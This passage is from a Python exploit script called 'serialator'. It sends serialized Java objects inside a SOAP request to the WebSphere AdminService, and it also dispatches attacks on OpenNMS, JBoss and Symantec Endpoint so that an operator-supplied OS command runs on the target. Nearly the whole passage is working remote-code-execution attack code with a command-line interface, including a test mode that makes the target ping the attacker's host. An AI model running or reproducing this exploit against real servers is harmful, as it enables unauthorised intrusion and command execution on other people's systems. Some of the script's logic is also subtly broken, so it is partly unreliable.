    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <SOAP-ENV:Header ns0:JMXConnectorContext="rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/////dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv////50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwSGFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmludGVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4" xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.7" ns0:JMXMessageVersion="1.2.0" ns0:JMXVersion="1.2.0">
    </SOAP-ENV:Header>
    <SOAP-ENV:Body>
    <ns1:invoke xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <objectname xsi:type="ns1:javax.management.ObjectName">rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==</objectname>
    <operationname xsi:type="xsd:string">getUnsavedChanges</operationname>
    <params xsi:type="ns1:[Ljava.lang.Object;">%s</params>
    <signature xsi:type="ns1:[Ljava.lang.String;">rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=</signature>
    </ns1:invoke>
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>""" % serObjB64_3 # Append the payload to the request body.
    
    if SSL_On:
        webservice = httplib2.Http(disable_ssl_certificate_validation=True)
        URL_ADDR = "%s://%s:%s" % ('https',HOST,PORT)
    else:
        webservice = httplib2.Http()
        URL_ADDR = "%s://%s:%s" % ('http',HOST,PORT)
    headers = {"User-Agent":"WebSphere_RCE_POC",
            "Content-type":"text/xml; charset=\"UTF-8\"",
            "SOAPAction":"\"urn:AdminService\"",
            "Content-length":"%d" % len(body)
        }
    print("[i] Sending attack payload to %s" % URL_ADDR)
    resp, content = webservice.request(URL_ADDR+"/", "POST", body=body, headers=headers)
    # print provided response.
    print("[i] Response received from target: %s" % resp)
    
if __name__ == "__main__":
    
    #
    # Main function
    #
    if not sys.version_info >= (3, 0):
        sys,exit("[x] WARNING - this script requires Python 3.x. Exiting")
    
    # Setup command line arguments
    cmdparser = argparse.ArgumentParser(prog="serialator", usage="""
  ____            _       _       _             
 / ___|  ___ _ __(_) __ _| | __ _| |_ ___  _ __ 
 \___ \ / _ \ '__| |/ _` | |/ _` | __/ _ \| '__|
  ___) |  __/ |  | | (_| | | (_| | || (_) | |   
 |____/ \___|_|  |_|\__,_|_|\__,_|\__\___/|_|
                    by Nikhil Sreekumar (@roo7break) v {version}

    Usage: python3 %(prog)s [options]

    Options:
        -t          Target (required)
        -p          Port (required)
        -c          CMD (required)
        --serv      Target Service (default: websphere)
        --ssl       Use SSL (default: OFF)
        --test      Test if target is vulnerable (default: OFF)
    """.format(version=version), formatter_class=argparse.RawTextHelpFormatter)
    cmdparser.add_argument("-t", "--target", default="127.0.0.1", help="Target host", required=True)
    cmdparser.add_argument("-p", "--port", default="", type=int, help="Target port", required=True)
    cmdparser.add_argument("-c", "--cmd", default="", help="OS command to execute")
    cmdparser.add_argument("--serv", default="websphere", choices=["websphere", "opennms", "jboss","symantec"])
    cmdparser.add_argument("--ssl", action="store_true", help="Use SSL for target service")
    cmdparser.add_argument("--test", action="store_true", help="Use to test for vulnerability")
    
    cmdargs = cmdparser.parse_args()

    if cmdargs.test:
        answ = input("[i] Before we start, I highly recommend you start Wireshark (filter: icmp.type == 8) or ICMPListener, now. Ready? (y/yes) ")
        if answ.lower() == 'y' or answ.lower() == 'yes':
            print("[i] Awesome. Lets ask the target server to ping our system")
            tgtos = input("[?] What do you think the target OS is (win/unix): ")
            if tgtos.lower == "win":
                host_ip = input("[?] Provide LHOST: ")
                print("[i] Windows target selected. Sending \'ping -n 5 <attack_ip>'\ to target.")
                cmdargs.cmd == "ping -n 5 %s" % host_ip
            else:
                host_ip = input("[?] Provide LHOST: ")
                print("[i] Unix target selected. Sending \'ping -c 5 <attack_ip>'\ to target.")
                cmdargs.cmd == "ping -n 5 %s" % host_ip
        else:
            print("[i] Lazy bugger.. right, I am gonna continue anyway.")

    if cmdargs.serv == "websphere":
        print("[i] WebSphere selected as target app.")
        if cmdargs.test:
            websphere_attack(cmdargs.target, cmdargs.port, cmdargs.ssl, cmdargs.cmd)
        else:
            if cmdargs.cmd == None:
                sys.exit("[x] You didnt provide any command to run. Exiting..")
            websphere_attack(cmdargs.target, cmdargs.port, cmdargs.ssl, cmdargs.cmd)
    elif cmdargs.serv == "opennms":
        print("[i] OpenNMS selected as target app.")
        if cmdargs.test:
            opennms_attack(cmdargs.target, cmdargs.port, cmdargs.cmd)
        else:
            if cmdargs.cmd == None:
                sys.exit("[x] You didnt provide any command to run. Exiting..")
            opennms_attack(cmdargs.target, cmdargs.port, cmdargs.cmd)
    elif cmdargs.serv == "jboss":
        print("[i] JBoss selected as target app.")
        if cmdargs.test:
            jboss_attack(cmdargs.target, cmdargs.port, cmdargs.ssl, cmdargs.cmd)
        else:
            if cmdargs.cmd == None:
                sys.exit("[x] You didnt provide any command to run. Exiting..")
            jboss_attack(cmdargs.target, cmdargs.port, cmdargs.ssl, cmdargs.cmd)
    else:
        print("[i] Symantec Endpoint selected as target app.")
        if cmdargs.test:
            symantec_endpoint_attack(cmdargs.target, cmdargs.port, cmdargs.ssl, cmdargs.cmd)
        else:
            if cmdargs.cmd == None:
                sys.exit("[x] You didnt provide any command to run. Exiting..")
            symantec_endpoint_attack(cmdargs.target, cmdargs.port, cmdargs.ssl, cmdargs.cmd)

    print("[i] Thank you for using this tool. Contact author for any comments.")
